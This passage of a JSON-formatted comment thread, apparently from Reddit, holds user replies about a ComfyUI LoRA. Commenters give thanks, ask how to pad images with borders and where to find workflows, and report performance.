          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1uzo3o",
          "author": "Thee_Watchman",
          "text": " I look forward to trying this out. Thanks, pal!",
          "score": 1,
          "created_utc": "2026-01-26 18:03:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v5rxw",
          "author": "Major-System6752",
          "text": "Can I add borders inside comfyui or I need to do that before, in external graphics editor?",
          "score": 1,
          "created_utc": "2026-01-26 18:28:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1wamyk",
              "author": "Simple-Variation5456",
              "text": "Yup, I think it's called \"pad\" where you can define how many pixels you want to add to left, right, top, bottom.",
              "score": 3,
              "created_utc": "2026-01-26 21:25:57",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o203cgo",
                  "author": "Major-System6752",
                  "text": "Thx. Something to frame the subject in the shot?",
                  "score": 1,
                  "created_utc": "2026-01-27 12:09:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vm9ef",
          "author": "gorpium",
          "text": "Thanks! Works very well! So fast! (5070/16)",
          "score": 1,
          "created_utc": "2026-01-26 19:38:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1zq3mx",
              "author": "Haunting-Hand2177",
              "text": "Where can I find a workflow for this one?",
              "score": 1,
              "created_utc": "2026-01-27 10:21:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1zs3mg",
                  "author": "gorpium",
                  "text": "Can't find it right now, but I just searched on Civitai for \"klein lora\" and workflow. You only need a simple flow with a LoRA loader in the middle.",
                  "score": 1,
                  "created_utc": "2026-01-27 10:38:43",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ylsa7",
          "author": "ANR2ME",
          "text": "Oh god that random naming for comfyui lora üò®",
          "score": 1,
          "created_utc": "2026-01-27 04:43:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yylei",
          "author": "Upset-Virus9034",
          "text": "Can you kindly share a workflow for this?",
          "score": 1,
          "created_utc": "2026-01-27 06:16:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1zf1c7",
          "author": "Practical-Nerve-2262",
          "text": "It's fine without LoRa, is it because using LoRa makes it more effective?",
          "score": 1,
          "created_utc": "2026-01-27 08:38:37",
          "is_submitter": false,
          "replies": []
        }
      ]
    }
  ]
}